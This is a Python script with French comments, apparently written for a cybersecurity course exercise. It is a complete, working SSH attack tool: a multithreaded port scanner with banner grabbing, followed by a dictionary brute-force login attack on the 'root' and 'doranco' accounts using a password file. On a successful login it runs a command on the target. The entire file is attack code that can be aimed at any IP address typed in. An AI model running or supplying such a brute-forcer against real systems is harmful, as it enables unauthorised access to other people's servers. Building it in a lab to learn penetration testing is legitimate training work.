#!/usr/bin/env python3
import sys
import socket
import threading
import time
import subprocess
import os

# Configuration fixe
DICTIONARY_PATH = r"C:\Users\stagiaire\Documents\cours cyber\github\Cybersec\TP-01\passwords.txt"
THREAD_LIMIT = 50
SSH_TIMEOUT = 5
SCAN_TIMEOUT = 1
USERS_TO_TEST = ["root", "doranco"]


def install_dependencies():
    """Installe paramiko automatiquement si absent"""
    try:
        import paramiko
    except ImportError:
        print("[!] Installation du module 'paramiko'...")
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", "paramiko"])
            print("[+] Installation réussie")
        except Exception as e:
            print(f"[ERREUR] Impossible d'installer paramiko: {e}")
            sys.exit(1)


install_dependencies()
from paramiko import SSHClient, AutoAddPolicy, AuthenticationException, SSHException


def clear_screen():
    """Efface l'écran selon l'OS"""
    os.system('cls' if os.name == 'nt' else 'clear')


def show_banner():
    """Affiche le banner d'introduction"""
    print("""
    ###########################################
    #      Outil de Pentest SSH               #
    #      Scanner + Bruteforce               #
    #      Cibles: root, doranco              #
    ###########################################
    """)


def show_menu():
    """Affiche le menu principal"""
    print("\nMenu Principal:")
    print("1. Scanner les ports ouverts")
    print("2. Attaque Brute Force SSH")
    print("3. Scanner puis attaquer (mode complet)")
    print("4. Quitter")
    return input("\nChoisissez une option (1-4): ")


def scan_ports(target, start_port, end_port):
    """Scan une plage de ports"""
    open_ports = []
    print(f"\n[SCAN] Début du scan sur {target} (ports {start_port}-{end_port})...")

    def worker(port):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(SCAN_TIMEOUT)
                if s.connect_ex((target, port)) == 0:
                    banner = get_service_banner(target, port)
                    print(f"[+] Port {port}/tcp ouvert - {banner}")
                    open_ports.append(port)
        except:
            pass

    threads = []
    for port in range(start_port, end_port + 1):
        while threading.active_count() > THREAD_LIMIT:
            time.sleep(0.1)
        t = threading.Thread(target=worker, args=(port,))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    return open_ports


def get_service_banner(host, port):
    """Récupère le banner du service"""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(SCAN_TIMEOUT)
            s.connect((host, port))
            return s.recv(1024).decode(errors='ignore').strip() or "Service inconnu"
    except:
        return "Service inconnu"


def load_passwords():
    """Charge les mots de passe depuis le fichier fixe"""
    try:
        with open(DICTIONARY_PATH, 'r') as f:
            passwords = [pwd.strip() for pwd in f if pwd.strip()]
            if not passwords:
                print("[ERREUR] Le fichier passwords.txt est vide")
                sys.exit(1)
            return passwords
    except FileNotFoundError:
        print(f"[ERREUR] Fichier introuvable: {DICTIONARY_PATH}")
        sys.exit(1)


def ssh_attack(target, port, users, passwords):
    """Effectue l'attaque SSH"""
    ssh = SSHClient()
    ssh.set_missing_host_key_policy(AutoAddPolicy())

    for user in users:
        print(f"\n[ATTACK] Test sur {user}@{target}:{port}")

        for password in passwords:
            try:
                print(f"[>] Essai: {user}:{password[:20]}{'...' if len(password) > 20 else ''}", end='\r')

                ssh.connect(target, port=port, username=user,
                            password=password, timeout=SSH_TIMEOUT)

                print(f"\n[SUCCÈS] Connexion réussie! {user}:{password}")
                print("-" * 50)
                print(f"Commande SSH: ssh {user}@{target} -p {port}")

                # Exemple de commande
                stdin, stdout, stderr = ssh.exec_command('id')
                print(f"Info: {stdout.read().decode().strip()}")
                print("-" * 50)

                ssh.close()
                return True

            except AuthenticationException:
                continue
            except (SSHException, socket.error) as e:
                print(f"\n[!] Erreur réseau: {str(e)[:100]}")
                time.sleep(3)
                break
            except Exception as e:
                print(f"\n[!] Erreur inattendue: {str(e)[:100]}")
                continue

    print("\n[!] Aucune combinaison valide trouvée")
    return False


def main():
    clear_screen()
    show_banner()

    while True:
        choice = show_menu()

        if choice == '1':  # Scan seulement
            target = input("\nAdresse IP cible: ").strip()
            start_port = int(input("Port de début [1]: ") or 1)
            end_port = int(input("Port de fin [1024]: ") or 1024)

            open_ports = scan_ports(target, start_port, end_port)

            if open_ports:
                print("\n[RESULTAT] Ports ouverts:")
                for port in open_ports:
                    print(f"- Port {port}: {get_service_banner(target, port)}")
            else:
                print("\n[-] Aucun port ouvert trouvé")

            input("\nAppuyez sur Entrée pour continuer...")
            clear_screen()

        elif choice == '2':  # Attaque seulement
            target = input("\nAdresse IP cible: ").strip()
            port = int(input("Port SSH [22]: ") or 22)
            passwords = load_passwords()

            if ssh_attack(target, port, USERS_TO_TEST, passwords):
                input("\nAppuyez sur Entrée pour continuer...")
            clear_screen()

        elif choice == '3':  # Mode complet
            target = input("\nAdresse IP cible: ").strip()
            start_port = int(input("Port de début [1]: ") or 1)
            end_port = int(input("Port de fin [1024]: ") or 1024)
            passwords = load_passwords()

            open_ports = scan_ports(target, start_port, end_port)
            ssh_ports = [p for p in open_ports if 'ssh' in get_service_banner(target, p).lower()]

            if ssh_ports:
                print("\n[ATTACK] Début des attaques sur les ports SSH...")
                for port in ssh_ports:
                    if ssh_attack(target, port, USERS_TO_TEST, passwords):
                        break
            else:
                print("\n[-] Aucun service SSH trouvé")

            input("\nAppuyez sur Entrée pour continuer...")
            clear_screen()

        elif choice == '4':  # Quitter
            print("\n[+] Fermeture du programme...")
            sys.exit(0)

        else:
            print("\n[!] Choix invalide")
            time.sleep(1)
            clear_screen()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interruption par l'utilisateur")
        sys.exit(0)